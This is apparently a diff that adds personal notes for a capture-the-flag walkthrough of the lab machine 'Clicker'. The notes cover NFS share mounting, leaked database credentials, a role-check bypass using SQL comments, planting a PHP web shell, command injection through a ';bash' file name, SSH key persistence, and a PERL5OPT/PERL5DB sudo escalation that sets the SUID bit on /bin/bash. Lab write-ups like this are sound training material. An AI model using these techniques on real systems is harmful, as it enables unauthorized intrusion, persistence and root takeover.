@@ -1,0 +1,49 @@
+We can see from nmap we have ports 22, 80, rcp, and nfs (network file share)
+
+We can dig through the nfs mounts on the target with `/usr/sbin/showmount -e clicker.htb`
+Seeing a mnt point we need to setup out own mnt point to take what we can find/access
+
+using `sudo mkdir /mnt/dirName` we can add a new area for a mount point
+using `sudo mount /dev/sda1 <mnt folder location>` we set the mount
+
+using `mount -t nfs IP:share <mnt folder location> -nolock` we can take what we can from the NFS
+
+using `umount <mnt folder location>` we unset it after each use
+
+-----------------------------------
+After digging the mount point on the target we found a backup zip file that
+contains the source code for the website
+
+$db_server="localhost";
+$db_username="clicker_db_user";
+$db_password="clicker_db_password";
+$db_name="clicker";
+
+The source code shows a lot of the sql commands they run:
+"password"=>hash("sha256", $password)]; // passwords are encrypted with a sha256 hash algo
+----------------------------------
+
+SQLI is most likely not a route, sqlmap got no hits injecting in both username and password parameters
+
+SQL has multi-line comments using these we can bypass the role key check:
+` /save_game.php?level=10&clicks=10&role/**/=Admin `
+The clean up scripts on this box are absolutely insane so we need to be fairly quick to launch these escalations / RCEs if we need to in order to gain shells
+----------------------------------
+Inside of the same request we used to change our role, we can change the nickname so it is a PHP web shell, along with capturing the export request
+we can change the extension to php allowing us a shell as www-data
+=========================================
+Inside the box as www-data we can take the binary in /opt/manage and pass it to ghidra or we can pass it to decompile explorer to get a better view of the code
+
+The main exploit is an RCE passing 2 parameters: "takes the "/usr/bin/mysql -u clicker_db_user --password='clicker_db_password' clicker -v < " and adds out new file ';bash' and writes to the buffer area "/usr/bin/mysql -u clicker_db_user --password='clicker_db_password' clicker -v < ;bash" so when system runs it while the first cmd may error it still runs bash in the end"
+
+you need to make the file with touch /tmp/";bash", then run
+./binary 10 ../../../../tmp/'bash;' to gain a shell as jack
+
+Then we can dig at his .ssh dir and get his ssh key or plant our own and gain persistance on the box to cat user.txt
+========================================================
+Inside the moniter.sh there are two lines dealing with PERL, we can
+use perl set env bins to gain short RCE as root before they are unset.
+
+https://0xn3va.gitbook.io/cheat-sheets/web-application/command-injection
+
+sudo PERL5OPT=-d PERL5DB='system("chmod u+s /bin/bash");' /opt/monitor.sh
